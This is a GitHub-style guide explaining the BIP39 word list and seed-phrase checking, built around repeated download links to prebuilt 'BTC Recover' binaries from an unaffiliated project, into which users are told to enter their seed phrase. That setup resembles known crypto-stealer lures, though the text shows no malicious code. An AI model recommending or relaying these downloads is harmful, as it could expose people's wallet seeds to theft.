<p align="center"><img src="https://github.com/btc-recover-tool/learn/raw/HEAD/assets/banner-article.png" alt="BTC Recover BIP39 word list guide" width="100%"></p>
<h1 align="center">BTC Recover BIP39 word list guide</h1>
<p align="center">How the 2,048-word list helps you check a phrase.</p>

<p align="center">
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-FBB034?style=for-the-badge&logo=windows&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Windows"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-FBB034?style=for-the-badge&logo=apple&logoColor=1C1E22&labelColor=1C1E22" alt="Download for macOS"></a>
  <a href="https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-FBB034?style=for-the-badge&logo=linux&logoColor=1C1E22&labelColor=1C1E22" alt="Download for Linux"></a>
</p>

| Platform | Requirements | File |
|---|---|---|
| 🪟 Windows | Windows 10 or later, 64-bit | [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) |
| 🍎 macOS | macOS 10.13 High Sierra or later | [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) |
| 🐧 Linux | 64-bit (x86_64) distribution | [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) |

All versions and checksums are on the [v2.1.0 release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

> [!IMPORTANT]
> Only download from this GitHub release page.


---

## 💡 Short answer

Every seed word comes from a fixed 2,048-word list; checking against it finds typos before you run a search.

## 👀 You'll see this if

- A word on your backup looks odd
- You want to check spellings
- You wonder why some words are rejected

## 🤔 Why it happens

BIP39 uses a fixed English list where the first four letters identify each word. Knowing that lets you spot mistakes quickly.

The tool works from your clues. You tell it what you know for certain and what you are unsure of, and it turns that into a list of candidates. Each candidate is checked against your wallet, and the search stops when one fits. The narrower your clues, the faster the answer.

What makes this approach work is that most lockouts are small mistakes, not total losses: one smudged word, two swapped words, a password with a different capital letter. A program that tests those small variations quickly can often find the answer you were one step away from.

**Terms used here.** A candidate is one possible answer the tool tests. A search space is the full set of candidates. A known address is one you remember receiving to, which lets the tool confirm the right answer. An offline session means the computer has no network connection while you work.

**A typical case.** Someone finds their backup card after a house move. Eleven words are clear, one is water-stained, and they remember the wallet app but not the year. They write the eleven words down in order, mark the stained position, add the first receiving address from an old email and start the search offline. The point is not speed; it is that each detail they added removed guesses the tool would otherwise have to make, so the run stayed small and calm from start to finish.

## 🧭 Before you begin

Collect context. Which device or app created the wallet? What year? Did you ever add an extra passphrase? Do you have an old email showing a receiving address? Each fact either confirms a candidate or removes millions of wrong ones.

Offline is not a formality. Malware that reads keystrokes or clipboard contents needs a connection to send what it captures. Cutting the connection during recovery means even a compromised machine has no way to pass your seed on while you work.

Before a long search, test a short one. Enter a case you know the answer to, or limit the search to one position, and confirm the tool behaves as you expect. Then widen the search. This catches a wrong wallet type or a typo in your known words early.

## 🛠️ Step-by-step fix

1. Go offline.
2. Compare each word with the list.
3. Note any that do not appear.
4. Enter the phrase in BTC Recover.
5. Mark doubtful words.
6. Run the search.

If this is your first run, the [first recovery walkthrough](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-first-recovery-walkthrough.md) shows each screen. Need the installer checked first? See [verifying your BTC Recover download](https://github.com/btc-recover-tool/learn/blob/main/how-to/verify-btc-recover-download-sha256.md).

## 🔁 If that did not work

- If every word is valid, the order or checksum may be wrong
- Check the phrase length
- Consider a non-English list

Be realistic about large searches. Every unknown multiplies the work, so some cases finish in seconds and others are very long. When the estimate shows can't estimate, the most useful step is to remember or rule out one more detail.

**What a good session looks like.** You sit down with your notes, an offline computer and enough time. You run the smallest likely search first and note the result. If it fails, you widen one thing at a time, never several at once, so you always know what has been ruled out. Most successful recoveries look like this: methodical, unhurried and entirely private.

A related problem may be the real cause: try [btc recover typo password recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-typo-password-recovery.md).

Stuck after trying the steps above? Describe the problem, your system and the wallet type in a new issue on the BTC Recover issue tracker. Leave out every seed word, password and private key; helpers only need to know the shape of the problem, never the secret itself.

Honest expectations help: BTC Recover improves your odds by testing likely mistakes quickly, but it cannot invent information that is gone. If nothing matches after the likely cases, recheck the facts you were sure of.

## 🛡️ Prevention

- Use the first four letters
- Write clearly
- Keep backups dry

Finished? Delete wallet copies and notes from the computer, empty the bin, and keep your paper record somewhere safe. If you used a live USB system, simply shut it down; nothing is saved.

**Anti-phishing reminder:** no real helper will ever ask for your seed phrase, private key or wallet file. Messages offering recovery in exchange for those, or asking for an upfront fee, are scams. Keep your recovery between you and your own computer.

## ❓ FAQ

**How many words?**
2,048.

**Are there other languages?**
Yes, BIP39 has other lists.

**Is the last word special?**
It carries a checksum.

**Is BTC Recover free?**
Yes. There is no account, trial or fee on recovered funds.

---

## ⬇️ Download

Get [`btc-recover-v2.1.0.exe`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.exe) for Windows, [`btc-recover-v2.1.0.dmg`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.dmg) for macOS or [`btc-recover-v2.1.0.zip`](https://github.com/btc-recover-tool/BTC-Recover/releases/download/v2.1.0/btc-recover-v2.1.0.zip) for Linux. Checksums are on the [release page](https://github.com/btc-recover-tool/BTC-Recover/releases/tag/v2.1.0).

## 🔗 Related guides

- [BTC Recover for one missing seed word](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-one-missing-seed-word.md)
- [BTC Recover for a misspelled seed word](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-misspelled-seed-word.md)
- [BTC Recover 24-word seed recovery](https://github.com/btc-recover-tool/learn/blob/main/how-to/btc-recover-24-word-seed-recovery.md)
- [All BTC Recover guides](https://github.com/btc-recover-tool/learn)

_BTC Recover is an independent project built on BTCRecover, created by Christopher Gurnee in 2014 and maintained by 3rdIteration. It is not affiliated with or endorsed by either._
